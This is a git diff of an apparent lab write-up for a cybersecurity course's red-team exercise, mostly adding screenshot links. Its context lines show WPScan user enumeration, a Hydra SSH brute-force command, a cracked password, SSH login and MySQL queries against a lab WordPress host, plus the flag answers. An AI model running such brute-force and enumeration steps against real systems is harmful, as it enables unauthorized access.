@@ -6,13 +6,12 @@
 - Exploitation
 
 ### Exposed Services
-_TODO: Fill out the information below._
 
 Nmap scan results for each machine reveal the below services and OS details:
 
 ```bash
 $ nmap -A 192.168.1.0/24
-  # TODO: Insert scan output
+  - ![alt text] https://github.com/Juan-byte-megabyte/Rice-CyberSecurity-FinalProject/blob/025ff3ea5bce6ebc05f03ac40339df8e13f8ed29/Images/Offense%20Images/nmapscanfortarget1.png
 ```
 
 This scan identifies the services below as potential points of entry:
@@ -43,23 +42,24 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
     - **Exploits Used**
       - WPScan to enumerate users of the Target 1 WordPress site
         - wpscan --url http://192.168.1.110 --enumerate u
-        - Insert Picture file
+        - ![alt text] https://github.com/Juan-byte-megabyte/Rice-CyberSecurity-FinalProject/blob/8655bc671393f7d27d9d25ac768909c31c3b8594/Images/Offense%20Images/wpscanusers.png
     - Targeting User Michael
       - Executed Hydra Brute Force Attack
         - The following command was performed:
         - hydra -l michael -P /usr/share/wordlists/rockyou.txt 192.168.1.110 ssh
         - Password: Michael
-        - Insert Picture file
+        - ![alt text] https://github.com/Juan-byte-megabyte/Rice-CyberSecurity-FinalProject/blob/8a9ac76506c514988a6b20a129696a48ae0fc69e/Images/Offense%20Images/hydrabruteforcemichael.png
     - Capturing Flag 1: After SSH Brute Force Attack as Michael I traversed through directories and files.
       - Found Flag1 in  var/www/html folder at root in service.html in a HTML comment below the footer.
       - Commands:
         - ssh michael@192.168.1.110
         - pw: michael
+  - ![alt text] https://github.com/Juan-byte-megabyte/Rice-CyberSecurity-FinalProject/blob/8a9ac76506c514988a6b20a129696a48ae0fc69e/Images/Offense%20Images/sshmichaelpassword.png
         - cd ../
         - cd /var/www/html
         - ls -l
         - nano service.html
-  - insert picture
+  - ![alt text] https://github.com/Juan-byte-megabyte/Rice-CyberSecurity-FinalProject/blob/8a9ac76506c514988a6b20a129696a48ae0fc69e/Images/Offense%20Images/flag1.png
   - `flag2.txt`: fc3fd58dcdad9ab23faca6e9a3e581c
     - **Exploit Used**
       - Same exploit covered in flag1 to gain access
@@ -70,7 +70,8 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
         - cd /var/www
         - find / i-name flag*
         - cat flag2.txt
-  - insert picture
+  - ![alt text] https://github.com/Juan-byte-megabyte/Rice-CyberSecurity-FinalProject/blob/8a9ac76506c514988a6b20a129696a48ae0fc69e/Images/Offense%20Images/flag2hash.png
+  - ![alt text] https://github.com/Juan-byte-megabyte/Rice-CyberSecurity-FinalProject/blob/8a9ac76506c514988a6b20a129696a48ae0fc69e/Images/Offense%20Images/flag2.png
   - `flag3` : afc01ab56b50591e7dccf93122770cd2
     - **Exploit Used**
       - Previous exploit covered in flag1 and flag2
@@ -85,7 +86,9 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
           - use wordpress;
           - show tables;
           - select * from wp_posts;
-    - Insert picture
+   - ![alt text] https://github.com/Juan-byte-megabyte/Rice-CyberSecurity-FinalProject/blob/8a9ac76506c514988a6b20a129696a48ae0fc69e/Images/Offense%20Images/mysqlconnect.png
+   - ![alt text] https://github.com/Juan-byte-megabyte/Rice-CyberSecurity-FinalProject/blob/8a9ac76506c514988a6b20a129696a48ae0fc69e/Images/Offense%20Images/sqlshowdatabases.png
+   - ![alt text] 
   - `flag4` : 715dea6c055b9fe3337544932f2941ce
     - **Exploit Used**
       - Use of weak password salted hashes and Python root escalation privileges
